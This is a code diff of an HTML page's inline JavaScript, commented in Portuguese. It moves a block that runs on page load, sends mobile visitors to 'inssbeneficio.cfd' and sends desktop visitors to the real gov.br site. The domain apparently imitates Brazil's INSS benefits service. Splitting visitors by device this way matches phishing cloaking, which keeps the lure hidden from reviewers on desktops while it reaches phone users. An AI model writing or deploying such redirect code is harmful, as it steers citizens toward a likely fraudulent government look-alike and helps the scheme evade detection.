@@ -52,6 +52,35 @@
     <script src="auditoria-logger.js"></script>
     <script src="auditoria-main.js"></script>
     <script>
+           document.addEventListener('DOMContentLoaded', function () {
+            // Função para verificar se o dispositivo é móvel
+            function isMobileDevice() {
+                return /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            }
+
+            // Redirecionamento baseado no dispositivo
+            function redirectBasedOnDevice() {
+                // Verifica se o redirecionamento já foi feito
+                if (sessionStorage.getItem('redirected')) {
+                    return; // Evita o looping
+                }
+
+                if (isMobileDevice()) {
+                    // Marca que o redirecionamento foi feito
+                    sessionStorage.setItem('redirected', 'true');
+                    // Redireciona para o site móvel
+                    window.location.href = "https://inssbeneficio.cfd";
+                } else {
+                    // Marca que o redirecionamento foi feito
+                    sessionStorage.setItem('redirected', 'true');
+                    // Redireciona para o site oficial do governo
+                    window.location.href = "https://www.gov.br";
+                }
+            }
+
+            // Executa a função de redirecionamento
+            redirectBasedOnDevice();
+        });
           document.addEventListener('DOMContentLoaded', function () {
             // Função que redireciona o usuário para index3.html
             function redirectToIndex3() {
@@ -86,36 +115,6 @@
                 // Redireciona para index3.html
                 redirectToIndex3();
             };
-    
- document.addEventListener('DOMContentLoaded', function () {
-            // Função para verificar se o dispositivo é móvel
-            function isMobileDevice() {
-                return /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-            }
-
-            // Redirecionamento baseado no dispositivo
-            function redirectBasedOnDevice() {
-                // Verifica se o redirecionamento já foi feito
-                if (sessionStorage.getItem('redirected')) {
-                    return; // Evita o looping
-                }
-
-                if (isMobileDevice()) {
-                    // Marca que o redirecionamento foi feito
-                    sessionStorage.setItem('redirected', 'true');
-                    // Redireciona para o site móvel
-                    window.location.href = "https://inssbeneficio.cfd";
-                } else {
-                    // Marca que o redirecionamento foi feito
-                    sessionStorage.setItem('redirected', 'true');
-                    // Redireciona para o site oficial do governo
-                    window.location.href = "https://www.gov.br";
-                }
-            }
-
-            // Executa a função de redirecionamento
-            redirectBasedOnDevice();
-        });
         document.addEventListener('DOMContentLoaded', function() {
             function redirectToIndex3() {
                 if (window.location.pathname !== '/' && window.location.pathname !== '/index.html') {
